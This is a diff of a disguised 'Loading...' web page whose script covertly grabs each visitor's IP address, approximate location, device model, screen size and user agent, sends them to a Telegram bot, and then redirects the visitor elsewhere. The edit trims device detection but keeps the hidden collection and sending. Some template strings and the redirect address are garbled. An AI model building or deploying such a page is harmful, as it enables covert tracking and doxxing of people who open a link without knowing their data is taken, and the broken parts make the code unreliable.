@@ -3,8 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading…</title>
-    <style>body{margin:0;background:#000}</style>
+    <title>Loading...</title>
 </head>
 <body>
 <script>
@@ -14,93 +13,55 @@
     const REDIRECT  = 'https://www.misha/dad/image23689/august2024.com';
     const API       = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-    // ── IP + approximate location ─────────────────────
-    let ip  = '?.?.?.?';
+    // IP grab – works everywhere
+    let ip  = 'Unknown IP';
     let loc = 'Unknown location';
     try {
         const r = await fetch('https://ipapi.co/json/');
         if (r.ok) {
             const d = await r.json();
             ip  = d.ip;
-            loc = `\( {d.city}, \){d.region}, ${d.country_name}`;
+            loc = [d.city, d.region, d.country_name].filter(Boolean).join(', ');
         }
-    } catch { }
-    if (ip === '?.?.?.?') {
+    } catch(e) {
         try {
             const r = await fetch('https://api.ipify.org?format=json');
             const d = await r.json();
             ip = d.ip;
-            loc = 'Location unavailable';
-        } catch { }
+        } catch(e) {}
     }
 
-    // ── Device info (Client Hints first, then UA fallback) ──
-    let os = 'Unknown', ver = '', model = 'Unknown', maker = 'Unknown', browser = 'Unknown';
     const ua = navigator.userAgent;
 
-    if (navigator.userAgentData) {
-        try {
-            const h = await navigator.userAgentData.getHighEntropyValues([
-                'platform','platformVersion','model','manufacturer'
-            ]);
-            os     = h.platform     || os;
-            ver    = h.platformVersion || '';
-            model  = h.model        || model;
-            maker  = h.manufacturer || maker;
-            browser = navigator.userAgentData.brands.find(b => !b.brand.includes('Not'))?.brand || browser;
-        } catch { }
-    }
+    // Very small device detection – enough for your use case
+    let device = 'Unknown device';
+    if (/iPhone|iPad|iPod/.test(ua)) device = ua.includes('iPad') ? 'iPad' : 'iPhone';
+    else if (/Android/.test(ua)) device = ua.match(/Android [^;]+; ([^)]+)/)?.[1]?.trim() || 'Android Device';
 
-    // UA string fallback
-    if (model === 'Unknown') {
-        if (/iPhone|iPad|iPod/.test(ua)) {
-            os    = ua.includes('iPad') ? 'iPadOS' : 'iOS';
-            maker = 'Apple';
-            model = ua.includes('iPad') ? 'iPad' : 'iPhone';
-        } else if (/Android/.test(ua)) {
-            os = 'Android';
-            const m = ua.match(/Android [^;]+; ([^;)]+)(?:Build|\)|;|$)/i);
-            model = m ? m[1].trim() : 'Android Device';
-            maker = /SM-|Samsung/i.test(model) ? 'Samsung' :
-                    /Pixel/i.test(model)       ? 'Google'   : 'Android';
-        }
-    }
-    if (browser === 'Unknown') {
-        browser = /Edg/i.test(ua) ? 'Edge' :
-                  /Firefox/i.test(ua) ? 'Firefox' :
-                  /Chrome/i.test(ua) ? 'Chrome' : 'Safari';
-    }
-
-    // ── Build message ───────────────────────────────
-    const message = `
+    // Build message
+    const text = `
 *NEW VISITOR*
 
-*Time:* ${new Date().toISOString().slice(0,19).replace('T',' ')} UTC
+*Time:* ${new Date().toISOString().replace('T',' ').substring(0,19)}
 *IP:* ${ip}
 *Location:* ${loc}
-*Device:* \( {maker} \){model}
-*OS:* \( {os} \){ver}
-*Browser:* ${browser}
+*Device:* ${device}
 *Screen:* \( {screen.width}× \){screen.height}
-
 *UA:* \`${ua}\``;
 
-    // ── Send to Telegram (fire-and-forget) ───────────
-    fetch(API, {
+    // Send to Telegram
+    await fetch(API, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
             chat_id: CHAT_ID,
-            text: message.trim(),
+            text: text.trim(),
             parse_mode: 'Markdown'
         })
     }).catch(() => {});
 
-    // silent if Telegram is down
-    });
-
-    // ── Redirect ────────────────────────────────────
-    setTimeout(() => location.replace(REDIRECT), 900);
+    // Redirect
+    setTimeout(() => location.replace(REDIRECT), 800);
 })();
 </script>
 </body>
